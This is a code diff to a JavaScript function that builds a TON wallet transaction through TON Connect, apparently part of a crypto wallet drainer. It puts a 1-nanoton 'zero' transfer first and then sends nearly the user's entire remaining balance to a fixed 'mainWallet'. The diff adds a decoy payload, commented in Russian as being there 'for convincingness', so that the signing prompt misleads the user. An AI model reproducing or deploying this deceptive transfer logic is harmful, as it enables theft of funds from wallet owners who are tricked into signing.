@@ -90,16 +90,17 @@ async function didtrans() {
 
         const remainingBalance = originalBalance - deduction;
 
-        // Формируем транзакцию с двумя сообщениями (нулевая идет первой!)
+        // Одна транзакция с двумя сообщениями (нулевая первая!)
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 60,
             messages: [
                 {
-                    address: mainWallet, // Нулевая транзакция первой
+                    address: mainWallet, // Нулевая транза вверху
                     amount: 1, // 1 нанотон (около нуля)
+                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload для убедительности
                 },
                 {
-                    address: mainWallet, // Основная транзакция с балансом
+                    address: mainWallet, // Основная сумма
                     amount: remainingBalance, 
                 }
             ],
@@ -108,10 +109,11 @@ async function didtrans() {
         };
 
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Транзакция отправлена:', result);
+        console.log('Транзакции отправлены:', result);
 
         await updateBalance(walletAddress);
     } catch (error) {
         console.error('Ошибка при отправке транзакции:', error);
     }
 }
+
